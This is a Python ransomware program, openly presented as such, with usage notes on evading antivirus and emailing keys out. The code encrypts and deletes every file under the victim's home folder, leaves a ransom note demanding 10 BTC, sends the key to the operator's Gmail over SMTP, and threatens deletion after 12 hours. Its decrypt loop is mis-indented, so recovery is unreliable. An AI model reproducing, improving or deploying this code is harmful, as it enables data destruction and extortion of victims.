# █████╗ ███████╗███████╗██╗  ██╗██╗  ██╗
#██╔══██╗██╔════╝██╔════╝██║  ██║██║  ██║
#███████║█████╗  ███████╗███████║███████║
#██╔══██║██╔══╝  ╚════██║██╔══██║██╔══██║
#██║  ██║███████╗███████║██║  ██║██║  ██║
#╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
#
#aes file encryptor and decryptor WIN ED
#
#this program is a VERY basic repersentation of the possibilities that a proper ransomware program could show,
#this program has already been sent though virus total checker so the code is known to AV software. At time of
#editting this code virus total shows 5/60 AV's detected it.
#
# USAGE #
#
#this program is VERY barebones but still can techniqally run. The imported modules are os, time, shutil, secrets,
#stmplib, pyaescrypt, pathlib, and datetime. Be aware new updates to these modules may need to be installed from
#time to time. 
#
#To get emails containing decryption keys you need to own a gmail account and have an 'App Password'
#this can be found within the security section in your gmail settings, search for "App Password" and click on the
#available option. (2FA is required).
#
#file and directory paths may change depending on target pc's configuration. Be aware of this before running.


import os
import time
import shutil
import secrets  
import smtplib
import pyAesCrypt
from pathlib import Path
from datetime import datetime, timedelta

## personal advice is to keep credidentals in a custom module and use "pip install ." after creating setup.py and __init__.py ##
s_e = "youremail@gmail.com" ## change data to your gmail ##
r_e = "youremail@gmail.com" ## change this to your email also or whoever you like, but beware of keys getting leaked ##
smtp_server = "smtp.gmail.com"
smtp_port = 587
pasz = "your app pass word" ## change this to the 16 digit app password found if security section of gmail ##
payinfo = """oopsies youve been hacked

All your files have been encrypted.

To decrypt you need a decryption key that you can get by paying a ransom

pay 10 BTC to
BLABLABLABLABLABLABLABLABLABLABLABLA
"""
key = secrets.token_hex(24)
corkey = key

def email_send():
    subject = "Decryption Key for "+str(os.getlogin())
    body = key
    message = f"Subject: {subject}\n\n{body}"
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(s_e, pasz)
        server.sendmail(s_e, r_e, message)

fs_path = []
for root, dirs, files in os.walk(os.path.expanduser("~")):
    for dir in dirs:
        fs_path.append(os.path.join(root, dir))

def aes_enc():
    for folder_path in fs_path:
        for file in os.listdir(folder_path):
            bufferSize = 64*1024
            file_path = os.path.join(folder_path, file)
            if not file.endswith(".aes"):
                pyAesCrypt.encryptFile(file_path, file_path+".aes", key, bufferSize)
                destination_path = os.path.join(folder_path,"encrypted_"+file+".aes")
                shutil.move(file_path+".aes", destination_path)
                os.remove(file_path)
                ## possibly add an RSA tool after AES encryption to make it more solid and secure##

def code_wri():
    desktop_path = Path.home() / "Desktop" ## change location if you feel its nessesary ##
    os.chdir(desktop_path)
    with open("RANSOM PAY", "w") as falaphal:
        falaphal.write(payinfo)
        falaphal.close()

def aes_dec():
    for folder_path in fs_path:
        for file in os.listdir(folder_path):
            bufferSize = 64*1024
        file_path = os.path.join(folder_path, file)
        if file.endswith(".aes"):
            pyAesCrypt.decryptFile(file_path, file_path[:-4], key, bufferSize)
            destination_path = os.path.join(folder_path,"decrypted_"+file[:-4])
            shutil.move(file_path[:-4], destination_path)
            os.remove(file_path)
            ## if added rsa encryption add add rsa decryption ##

def display_time():
    current_time = datetime.now()
    future_time = current_time + timedelta(hours=13)
    formatted_time = future_time.strftime("%Y-%m-%d %H:%M:%S")
    print(f"Current Time: {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Time before internal timer is up: {formatted_time}")
    print("""You have 12 hours total to pay ransom or all data will be deleted
          """)

def first_block_of_code():
    print("Please enter a valid decryption key.")

def second_block_of_code():
    print("Key has been accepted. Decrypting data.")

def wrong_code():
    print("Incorrect decryption key.")

if __name__ == "__main__":
    aes_enc()
    code_wri()
    email_send()
    display_time()
    time.sleep(1)
    while True:
        first_block_of_code()
        uput = input("Enter the key: ")
        if uput == corkey:
            second_block_of_code()
            aes_dec()
            break
        if uput != corkey:
            wrong_code()